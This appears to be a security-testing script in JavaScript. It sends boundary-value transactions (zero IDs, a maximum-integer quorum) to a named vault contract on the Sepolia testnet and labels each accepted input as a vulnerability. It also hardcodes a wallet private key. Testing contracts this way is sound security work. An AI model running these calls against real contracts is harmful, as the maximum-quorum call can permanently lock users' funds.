const { ethers } = require("ethers");

// === VULNERABILITY: Zero-Value Exploit ===
// Can we break vault logic with zero/empty values?

const RPC_URL = "https://ethereum-sepolia.publicnode.com";
const CUSTODY_ADDRESS = "0x3B3AD30e32fFef3dD598dd3EfDf6DCC392897786";
const TEST_PK = "0xa12f4dc456a8fa989f093604e702384f9691f99c3242f615fc9a1ba0d3b3eaf2";

const ABI = [
    "function createVault(bytes32 _creator) external",
    "function addParticipant(bytes32 _creator, bytes32 _participant, string _shard) external",
    "function confirmParticipant(bytes32 _creator, bytes32 _participant, bool _confirmation) external",
    "function defineQuorum(bytes32 _creator, uint256 _minParticipants) external",
    "function getParticipants(bytes32 _creator) external view returns (bytes32[])",
    "function getQuorum(bytes32 _creator) external view returns (uint256)"
];

async function main() {
    console.log("=== ZERO-VALUE EXPLOITATION TEST ===\n");
    console.log(`Target: ${CUSTODY_ADDRESS}\n`);
    console.log("=".repeat(70));

    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    const wallet = new ethers.Wallet(TEST_PK, provider);
    const contract = new ethers.Contract(CUSTODY_ADDRESS, ABI, wallet);

    console.log(`Tester: ${wallet.address}\n`);

    const vaultId = ethers.utils.formatBytes32String(`ZeroTest${Date.now()}`);

    console.log(`[SETUP] Creating vault...`);
    try {
        const tx = await contract.createVault(vaultId, { gasLimit: 300000 });
        await tx.wait();
        console.log(`✅ Vault created\n`);
    } catch (e) {
        console.log(`❌ Failed: ${e.message}`);
        return;
    }

    console.log("=".repeat(70));
    console.log("\n[TEST 1] Zero Bytes32 Participant ID\n");

    try {
        const zeroParticipant = ethers.constants.HashZero; // 0x000...000
        const tx = await contract.addParticipant(vaultId, zeroParticipant, "test_shard", { gasLimit: 300000 });
        const receipt = await tx.wait();

        console.log(`🚨 VULNERABILITY: Zero participant ID accepted`);
        console.log(`Transaction: ${receipt.transactionHash}`);

        const participants = await contract.getParticipants(vaultId);
        console.log(`Participant count: ${participants.length}`);
        console.log(`\nImpact:`);
        console.log(`  • Breaks participant counting logic`);
        console.log(`  • Can create "invisible" participants`);
        console.log(`  • Quorum calculations may be incorrect`);
        console.log(`\nSeverity: MEDIUM-HIGH (Logic Bypass)`);

    } catch (e) {
        console.log(`✅ Protected: ${e.reason || e.message}`);
    }

    console.log("\n" + "=".repeat(70));
    console.log("\n[TEST 2] Create Vault with Zero ID\n");

    try {
        const zeroVault = ethers.constants.HashZero;
        const tx = await contract.createVault(zeroVault, { gasLimit: 300000 });
        const receipt = await tx.wait();

        console.log(`🚨 VULNERABILITY: Zero vault ID accepted`);
        console.log(`Transaction: ${receipt.transactionHash}`);
        console.log(`Impact:`);
        console.log(`  • Vault mapping collision risk`);
        console.log(`  • Multiple users could share same "zero vault"`);
        console.log(`  • State corruption possible`);
        console.log(`\nSeverity: HIGH (State Corruption)`);

    } catch (e) {
        console.log(`✅ Protected: ${e.reason || e.message}`);
    }

    console.log("\n" + "=".repeat(70));
    console.log("\n[TEST 3] Quorum = MAX_UINT256\n");

    try {
        const maxQuorum = ethers.constants.MaxUint256;
        const tx = await contract.defineQuorum(vaultId, maxQuorum, { gasLimit: 300000 });
        const receipt = await tx.wait();

        const quorum = await contract.getQuorum(vaultId);
        console.log(`🚨 VULNERABILITY: Quorum set to MAX_UINT256`);
        console.log(`Transaction: ${receipt.transactionHash}`);
        console.log(`Quorum value: ${quorum.toString()}`);
        console.log(`Impact:`);
        console.log(`  • Impossible to reach quorum`);
        console.log(`  • Permanent vault freeze`);
        console.log(`  • All funds locked forever`);
        console.log(`\nSeverity: CRITICAL (Permanent Fund Loss)`);

    } catch (e) {
        console.log(`✅ Protected: ${e.reason || e.message}`);
    }

    console.log("\n" + "=".repeat(70));
    console.log("\n[TEST 4] Empty String Shard (Already Tested)\n");
    console.log(`Note: Empty shard acceptance already verified as MEDIUM severity`);

    console.log("\n" + "=".repeat(70));
    console.log("\n✅ ZERO-VALUE TESTING COMPLETE");
}

main().catch(console.error);
